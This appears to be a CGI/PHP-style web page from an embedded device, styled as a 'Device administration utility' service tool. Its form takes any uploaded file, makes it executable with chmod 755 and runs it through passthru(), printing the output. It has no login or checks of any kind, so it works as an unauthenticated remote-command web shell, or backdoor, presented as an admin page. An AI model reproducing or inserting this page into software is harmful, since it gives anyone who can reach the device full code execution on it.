#!/sbin/cgi
<html>
<head>
<title>Device administration utility</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<style type="text/css">
body, td, th, table {
    font-family: Verdana, Arial, Helvetica, sans-serif;
    font-size: 12px;
}
th { border: 1px solid #aaa;
background-color: #eee;
color: #900;
text-align: left;
text-indent: 10px;
white-space: nowrap;
margin-left: 10px;
font-size: 14px;
font-weight: normal;
letter-spacing: 0.3em;
width: 100%;
}
td { padding-left: 20px; padding-right: 20px; padding-top: 5px }
table { border: 0px; width: 700px }
pre {
background-color: #FFFCE2; 
border: 1px solid #666; 
padding: 5px 5px 5px 5px;
}
input[type=submit], input[type=reset] {
background: #eee;
color: #222;
border: 1px outset #ccc;
padding: .1em .5em;
}
input[type=text], input[type=file]{ padding: .25em .5em }
input[type=text]:focus, input[type=password]:focus, input[type=file]:focus { 
border: 1px solid #886 
}
input[type=text], input[type=file]{
background: #fff;
color: #000;
border: 1px solid #d7d7d7;
}
</style>
</head>
<body bgcolor=white>
<a href="index.cgi">Main</a>
<table align="center">
<tr><th>Service Tool</th></tr>
<tr><td>
<form enctype="multipart/form-data" action="<?echo $PHP_SELF;>" method="POST">
File: <input name="file" type="file" size="45">
<input name="action" type="hidden" value="upload">
<input type="submit" value="Execute!">
</form>
<br>
<? if ($REQUEST_METHOD=="POST" && $action=="upload") {
    chmod($file, "755");
    echo("<pre>\n");
    echo("Uploaded file: " + htmlspecialchars($file) + "\n");
    echo("Uploaded file size: " + $file_size);
    echo("\n</pre>");
    echo("<pre>\n");
    passthru($file);
    echo("\n</pre>");
   }>
</td></tr>
<tr><td>&nbsp;</td></tr>
</table>
</body>
</html>
